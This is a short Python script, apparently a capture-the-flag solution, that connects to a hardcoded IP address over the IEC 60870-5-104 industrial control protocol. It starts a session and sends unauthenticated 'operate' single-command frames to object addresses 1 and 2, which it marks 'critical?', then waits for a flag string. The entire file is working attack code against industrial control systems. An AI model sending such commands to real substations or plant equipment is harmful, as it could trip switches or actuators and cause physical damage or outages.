#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

class IEC104:
    def __init__(self, s):
        self.s = s
        self.tx = 0  # send seq
        self.rx = 0  # recv seq
        
    def send_u(self, ctrl):
        # U-frame: ctrl is 1 byte
        frame = bytes([0x68, 0x04, ctrl, 0x00, 0x00, 0x00])
        self.s.send(frame)
        return frame
        
    def send_i(self, asdu):
        # I-frame with seq numbers
        apci = bytes([0x68, len(asdu) + 4, 
                      self.tx & 0xFF, (self.tx >> 8) & 0xFF, 
                      self.rx & 0xFF, (self.rx >> 8) & 0xFF])
        self.tx += 2
        self.rx += 2  # or handle properly
        self.s.send(apci + asdu)
        return apci + asdu

def main():
    s = socket.socket()
    s.settimeout(300)
    iec = IEC104(s)
    try:
        s.connect((HOST, PORT))
        # STARTDT
        iec.send_u(0x07) # STARTDT ACT
        time.sleep(2)
        r = s.recv(1024)
        print('start:', r.hex() if r else 'none')
        
        ca = bytes([0x01, 0x00]) # ASDU addr
        # Try IOA 1 - critical?
        ioa = bytes([0x01, 0x00, 0x00])
        # C_SC_NA_1: type 45, VSQ 1, COT 6, OA 0, CA LE, IOA LE, SCO
        asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81]) # operate
        iec.send_i(asdu)
        time.sleep(2)
        try:
            r = s.recv(512)
            print(r.hex() if r else 'none')
        except:
            pass
        
        # Also try IOA 2
        ioa = bytes([0x02, 0x00, 0x00])
        asdu = bytes([45, 0x01, 0x06, 0x00]) + ca + ioa + bytes([0x81])
        iec.send_i(asdu)
        time.sleep(2)
        try:
            r = s.recv(512)
            print(r.hex() if r else 'none')
        except:
            pass
        
        print('waiting...')
        start = time.time()
        while time.time() - start < 150:
            try:
                s.settimeout(15)
                r = s.recv(8192)
                if not r: break
                print('DATA:', r.hex())
                if b'CTF{' in r:
                    print(r)
                    break
            except socket.timeout:
                iec.send_u(0x43) # TESTFR ACT
                continue
            except:
                break
    finally:
        try: s.close()
        except: pass

if __name__ == '__main__':
    main()
